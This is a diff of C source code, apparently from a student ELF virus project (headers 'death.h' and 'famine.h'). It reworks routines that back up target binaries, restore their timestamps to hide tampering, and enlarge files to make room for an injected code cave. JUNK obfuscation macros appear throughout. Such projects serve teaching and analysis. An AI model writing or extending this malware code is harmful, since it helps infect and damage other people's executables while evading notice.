@@ -4,12 +4,12 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
-#include <string.h>
 
 #include "death.h"
 #include "famine.h"
 #include "utils.h"
 #include "map.h"
+#include "error.h"
 #include "syscall.h"
 
 #define OLD_BINS_PATH_SIZE 20
@@ -68,32 +68,34 @@ int get_bss_size(int fd, uint64_t* bss_len, size_t size) {
 	return 0;
 }
 
-int prepare_disinfection(const char *filename, struct stat st, int fd) {
+int prepare_disinfection(const char *filename, struct stat st, uint8_t *file) {
 
-	//idk what i was thinking but we dont need 2 mmaps...
-	//we dont need fd either
-
-	mkdirat(AT_FDCWD, g_old_bins_path, 0755);
+	if (mkdirat(AT_FDCWD, g_old_bins_path, 0755)== -1 && g_errno != EEXIST) {
+		return -1;
+	} JUNK;
 
 	char old_bin_path[PATH_MAX];
 	char *ptr = old_bin_path;
 	ptr = ft_stpncpy(ptr, g_old_bins_path, OLD_BINS_PATH_SIZE);
-	ptr = ft_stpncpy(ptr, "/", 1);
-	ptr = ft_stpncpy(ptr, filename, ft_strlen(filename));
+	ptr = ft_stpncpy(ptr, ft_strrchr(filename, '/'), ft_strlen(filename));
 
 	int old_fd = open(old_bin_path, O_CREAT | O_WRONLY | O_EXCL, st.st_mode);
 	if (old_fd == -1) {
-		return -1;
+		return 0;
 	}
 
-	uint8_t *save = (uint8_t *)mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-	if (save == MAP_FAILED) {
+	if (write(old_fd, file, st.st_size) == -1) {
+		close(old_fd);
 		return -1;
 	} JUNK;
 
-	if (write(old_fd, save, st.st_size) == -1) {
+	struct timespec times[2] = {
+		st.st_atim,
+		st.st_mtim
+	};
+
+	if (utimensat(old_fd, NULL, times, 0) == -1) {
 		close(old_fd);
-		munmap(save, st.st_size);
 		return -1;
 	} JUNK;
 
@@ -127,9 +129,7 @@ int map_file(const char *filename, data_t *data) {
 		return -1;
 	} JUNK;
 
-	const size_t size = st.st_size + data->cave.p_size + bss_len;
-
-	//prepare_disinfection(filename, st, fd);
+	const size_t size = st.st_size + data->cave.v_size + bss_len;
 
 	if (ftruncate(fd, size) == -1) {
 		close(fd);
@@ -141,7 +141,7 @@ int map_file(const char *filename, data_t *data) {
 		close(fd);
 		return -1;
 	} JUNK;
-
+	
 	close(fd);
 
 	data->elf.size = st.st_size;
